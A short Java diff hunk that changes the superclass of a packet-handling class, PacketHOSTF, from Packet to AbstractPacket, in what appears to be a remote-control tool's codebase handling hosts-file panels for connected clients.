@@ -4,7 +4,7 @@ import com.redpois0n.Slave;
 import com.redpois0n.ui.frames.FrameControlPanel;
 import com.redpois0n.ui.panels.PanelControlHostsFile;
 
-public class PacketHOSTF extends Packet {
+public class PacketHOSTF extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String line) throws Exception {
